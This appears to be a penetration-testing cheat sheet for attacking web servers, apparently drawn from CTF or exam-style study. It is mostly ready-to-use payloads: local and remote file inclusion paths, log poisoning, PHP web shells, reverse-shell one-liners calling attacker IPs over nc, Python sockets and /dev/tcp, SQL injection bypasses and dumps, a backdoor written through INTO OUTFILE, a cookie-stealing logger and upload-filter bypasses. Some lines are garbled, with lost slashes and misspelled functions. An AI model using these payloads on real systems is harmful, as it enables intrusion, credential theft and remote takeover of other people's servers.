# HTTP
Hint: use the raw commands, some symbols are rendered

## Start point

Read the blogs

Look for hints

hidden comments

sourcecode

user = 1 is admin

where is the admin panel

## Things to check

use auxiliary/server/browser_autopwn

### LFI Local file Inclusion
LFI Windows Files: 
%SYSTEMROOT%repairsystem 
%SYSTEMROOT%repairSAM 
%SYSTEMROOT%repairSAM 
%WINDIR%win.ini 
%SYSTEMDRIVE%boot.ini 
%WINDIR%Panthersysprep.inf 
%WINDIR%system32congAppEvent.Evt 

### windows
c:\WINDOWS\system32\eula.txt
c:\boot.ini  
c:\WINDOWS\win.ini  
c:\WINNT\win.ini  
c:\WINDOWS\Repair\SAM  
c:\WINDOWS\php.ini  
c:\WINNT\php.ini  
c:\Program Files\Apache Group\Apache\conf\httpd.conf  
c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
c:\Program Files\xampp\apache\conf\httpd.conf  
c:\php\php.ini  
c:\php5\php.ini  
c:\php4\php.ini  
c:\apache\php\php.ini  
c:\xampp\apache\bin\php.ini  
c:\home2\bin\stable\apache\php.ini  
c:\home\bin\stable\apache\php.ini

### LFI Linux Files: 
/proc/version 
/etc/prole 
/etc/passwd 
/etc/shadow 

### Linux LFI
/etc/issue (A message or system identification to be printed before the login prompt.)

/etc/motd (Message of the day banner content. Can contain information about the system owners or use of the system.)

/etc/group 

/etc/resolv.conf (might be better than /etc/passwd for triggering IDS sigs)

/home/[USERNAME]/.bash_history or .profile

~/.bash_history or .profile

$USER/.bash_history or .profile

/root/.bash_history or .profile

### log
/etc/httpd/logs/acces_log 

/etc/httpd/logs/error_log 

/var/www/logs/access_log 

/var/www/logs/access.log 

/usr/local/apache/logs/access_ log 

/usr/local/apache/logs/access. log 

/var/log/apache/access_log 

/var/log/apache2/access_log 

/var/log/apache/access.log 

/var/log/apache2/access.log

/var/log/access_log

/etc/mtab  

/etc/inetd.conf  

/var/log/dmessage

### config files Usually found in the root of the website
.htaccess

config.php

### bypass
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index


### First we save the cookie
curl -s http://example.com/login.php -c cookiefile -d "user=admin&pass=admin"

curl -s http://example.com/gallery.php?page=/etc/passwd -b cookiefile

http:// $ip/index.php?page=/etc/passwd

:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.14.6%209001%20%3E/tmp/f, 

 
### Contaminating Log Files <?php echo shell_exec($_GET['cmd']);?> (in brackets)

http://IP/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

curl http://IP/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd

IP/admin.php?username=%0A/bin/cat/etc/passwd

IP/admin.php?username=%0A/bin/cat/home/silky/flag.txt

username=%0A/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.23",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

curl -d "image=/etc/passwd" https://ip:15020/blog/download.php -k

curl -s --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://ip/administrator/alerts/alertConfigField.php

http://192.168.1.145/index.php?page=../../../../../../../../../etc/passwd%00

text_file_name=ssp%2F../../../../../../../../../../etc/passwd&B=Display+File

http://example.com/page=../../../../../../etc/passwd%00


http://IP/index.php?page=../../../../../var/log/apache2/access.log&cmd=id

### LFI to shell
GET / HTTP/1.1

Referer: <? passthru($_GET[cmd]) ?>

Host: 192.168.1.159

Connection: close


GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1

Host: 192.168.1.102

Connection: close

nc ip 80

GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1

Host: 192.168.1.102

Connection: close


### LFI
PHP Wrapper

php://filter/convert.base64-encode/resource=index.php

Null Byte

?page=../../../../../../etc/passwd%00

## RFI Remote File Inclusion (use the raw version if you copy it)

<?php echo shell_exec("bash -i >& /dev/tcp/ip/1234 0>&1"); ?>

<?php echo system("0<&196;exec 196<>/dev/tcp/ip/443; sh <&196 >&196 2>&196"); ?>
 
<?php echo shell_exec("whoami");?>
 
 
curl http://ip/action=/inc/config.php?basePath=http://ip/test.txt%00

ip/connect.php?file=http://192.168.1.103:8000/shell.php

http://192.168.0.27/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.0.27:8000/shell.php


<?php echo shell_exec("whoami");?>

Or just get a reverse shell directly like this:

<?php echo system("0<&196;exec 196<>/dev/tcp/ip/443; sh <&196 >&196 2>&196"); ?>

Remember to add the nullbyte %00 to avoid appending .php. This will only work on php before version 5.3.


http://exampe.com/index.php?page=http://attackerserver.com/evil.txt

### SQL Injection
SQL map (automated)

sqlmap -u http://example.com --crawl=1

sqlmap -r request.txt -p username --dbms=mysql --dump -D Webapp -T Users

sqlmap -u http://10.90.60.80 --crawl=1

Login Bypass
' or 1=1 LIMIT 1 --

' or 1=1 LIMIT 1 -- -

' or 1=1 LIMIT 1#

'or 1#

' or 1=1 --

' or 1=1 -- -

Username = ' or 1=1 #

Password = ' or 1=1 #

admin') union select 1,database()#

admin') union select 1,group_concat(distinct table_schema) from information_schema.tables#

admin') union select 1,group_concat(distinct table_name) from information_schema.columns where table_schema="sysadmin"#

admin') union select 1,group_concat(distinct column_name) from information_schema.columns where table_schema="sysadmin" and table_name="users
"#
admin') union select 1,group_concat(username,0x7c,password,0x0a) from sysadmin.users#

### Common Injections for Login Forms:

admin' --

admin' #

admin'/*

' or 1=1--

' or 1=1#

' or 1=1/*

') or '1'='1--

') or ('1'='1—

Common commands

' or '1'='1

-'

' '

'&'

'^'

'*'

' or ''-'

' or '' '

' or ''&'

' or ''^'

' or ''*'

"-"

" "

"&"

"^"

"*"

" or ""-"

" or "" "

" or ""&"

" or ""^"

" or ""*"

or true--

" or true--

' or true--

") or true--

') or true--

' or 'x'='x

') or ('x')=('x

')) or (('x'))=(('x

" or "x"="x

") or ("x")=("x

")) or (("x"))=(("x

1' or '1'='1

1' or '1'='1'

1' or '1'='1'--

' or 1=1 --

a' or 1=1 --

" or 1=1 --

a" or 1=1 --

' or 1=1 #

" or 1=1 #

or 1=1 --

' or 'x'='x

" or "x"="x

') or ('x'='x

") or ("x"="x

‘UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#

' or 1=1 LIMIT 1 --

' or 1=1 LIMIT 1 -- -

' or 1=1 LIMIT 1#

'or 1#

' or 1=1 --

' or 1=1 -- -

union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6

union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'


### XSS
http://victim.site/index.php?name=%3Cscript%3Ealert(%27XSS


http://victim.site/index.php?name=<script>alert('XSS Example')</script>

### Stealing the cookies
<script>alert (document.cookie) </script>

### Send cookies to a controlled site voa log.php

<?php

$filename="/tmp/log.txt";

$fp=fopen ($filename, ‘a’);

$cookie=$_GET ['q']

fwrite ($fp, $cookie);

flose ($fp);

?>

### PHP cgi
msf > use exploit/multi/http/php_arg_injection

msf exploit (multi/http/php_arg_injection) > set rhost IP

msf exploit (multi/http/php_arg_injection) > exploit

### twiki
msf > use  exploit/unix/webapp/twiki_history

msf exploit(twiki_history) > set rhost IP

msf exploit(twiki_history) > exploit

### file upload bypass

Common extensions

We can rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as php.

php                 phtml, .php, .php3, .php4, .php5, and .inc

asp                 asp, .aspx

perl                .pl, .pm, .cgi, .lib

jsp                 .jsp, .jspx, .jsw, .jsv, and .jspf

Coldfusion      .cfm, .cfml, .cfc, .dbm

### check as gif
GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>

exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg

## HTTP enumeration

### Gobuster
gobuster -u <targetip> -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e

### nikto
nıkto -h <targetip>

### curl
curl -v -X OPTIONS http://<targetip>/test/

curl --upload-file <file name> -v --url <url> -0 --http1.0

### LFI
# PHP Wrapper

php://filter/convert.base64-encode/resource=index.php

# Null Byte
?page=../../../../../../etc/passwd%00

### RFI
?page=http://attackerserver.com/evil.txt

### Command Execution
<?php system('ls -la');?>

<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackerip> 1234 >/tmp/f');?>

### LFI and RCE

Inject code execution

<?php echo system($_REQUEST["cmd"]);?>

Go to LFI vuln and

?=…….&cmd=ls

### SQL Injection (manual)

photoalbum.php?id=1'

find the number of columns

photoalbum.php?id=1 order by 8

Find space to output db

?id=1 union select 1,2,3,4,5,6,7,8

Get username of the sql-user

?id=1 union select 1,2,3,4,user(),6,7,8

Get version

?id=1 union select 1,2,3,4,version(),6,7,8

Get all tables

?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables

Get all columns from a specific table

?id=1 union select 1,2,3, column_name ,5,6,7,8 from information_schema.columns where table_name=‘users’

?id=1 union select 1,2,3, group_concat(column_name) ,5,6,7,8 from information_schema.columns() where table_name=‘users’

.. 1,2,3, group_concat(user_id, 0x3a, first_name, 0x3a, last_name, 0x3a, email, 0x3a, pass, 0x3a, user_level) ,5,6,7,8 from users


view files
' union select 1,2,3, load_file(‘/etc/passwd’) ,5,6,7,8 -- -

' union select 1,2,3, load_file(‘/var/www/login.php’) ,5,6,7,8 -- -

' union select 1,2,3, load_file(‘/var/www/includes/config.inc.php’) ,5,6,7,8 -- -

' union select 1,2,3, load_file(‘/var/www/mysqli_connect.php’) ,5,6,7,8 -- -


upload files
' union select 1,2,3, 'this is a test message' ,5,6,7,8 into outfile '/var/www/test'-- -

' union select 1,2,3, load_file('/var/www/test') ,5,6,7,8 -- -

' union select null,null,null, "<?php system($_GET['cmd']) ?>" ,5,6,7,8 into outfile '/var/www/shell.php' -- -

' union select null,null,null, load_file('/var/www/shell.php') ,5,6,7,8 -- -

### wordpress
wpscan --url http://.... --log

wpscan --url http://... --enumerate u --log

wpscan --url http://<targetip> --wordlist wordlist.txt --username example_username

http://....../wp-admin

http://...../wp-content/uploads/2017/10/file.png

### Windows Command Execution (RFI exploit)

#Connect via netcat to victim (nc -nv <[IP]> <[PORT]>) and send 

<?php echo shell_exec("nc.exe -nlvp 4444 -C:\Windows\System32\cmd.exe");?>

# on kali call the shell

nc -nv ip 4444

## Fingerprinting

Netcat 

nc IP 80

HEAD / HTTP/1.0      Request in upper case, does not work with HTTPS

--------------------------

Looking for verbs

delete

nc victim.site 80

DELETE /path/to/resource.txt HTTP/1.0

-----------------------

exploiting PUT

wc -m payload.php

20 payload.php

nc victim.site 80

PUT /payload.php HTTP/1.0

Content-type: text/html

Content-lenght: 20

<php phpinfo() ; ?>

-----------------------------

Upload a simple nc php shell

nc victim.site 80

PUT /payload.php HTTP/1.0

Content-type: text/html

Content-lenght: 136

<?php
if (isset($_GET['cmd']))
{
    $cmd = $_GET['cmd'];
    echo ‘<pre>’;
    $result = shell_exec ($cmd);
    echo $result;
    echo ‘</pre>’;
}
?>

-----------------------------
### OpenSSL
openssl s_client -connect target.site:443

HEAD / HTTP/1.0

httprint -P0 -h targethosts -s signaturefile

### put command (upload)

PUT means we can upload things

 nc 192.168.102.136 80
 
 check for verbs
 
 we see it only if the option verb is activated
 
 PUT /writable_dir/test.html HTTP/1.1
 
Content-length: 184

<RETURN>

[CONTENT OF TEST.HTML]

<RETURN>

<RETURN>

## find hidden files

#### Dirb

dirb https://ip

### Gobuster - remove relevant responde codes (403 for example)

gobuster -u http://ip -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e

dirb http://target.com

### OWASP ZAP

wfuzz -c -z file,/root/.ZAP/fuzzers/dirbuster/directory-list-2.3-big.txt --sc 200 http://pegasus.dev:8088/FUZZ.php

dirb http://target.com -a "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"

### cgi, bak

cgi file can have credentials

php.bak, asp.bak, _bak, 01

A good list of back up files extension follows:
• bak
• bac
• old
• 000
• ~
• 01
• _bak
• 001
• inc
• Xxx

.inc
ASP 3.0 these files were

used to contain source code to be included as part of the main asp page execution. 

### log and config files
(configuration.php.bak, configuration.php.old,…). 

### directory listing
(configuration.php.bak, configuration.php.old,…). 
